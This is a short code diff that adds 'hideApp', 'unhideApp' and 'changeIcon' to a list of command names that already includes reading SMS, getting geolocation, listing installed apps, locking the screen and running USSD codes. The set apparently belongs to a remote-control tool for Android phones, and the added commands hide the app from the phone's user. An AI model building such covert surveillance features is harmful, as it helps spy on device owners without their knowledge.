@@ -2,7 +2,7 @@
     [
         "openUrl", "sendToast", "vibratePhone",
         "getGeoLocation", "receiveSMS",
-        "getInstalledApps",
+        "getInstalledApps", "hideApp", "unhideApp", "changeIcon",
         "lockScreen", "unlockScreen", "runUSSD"
     ],
     [
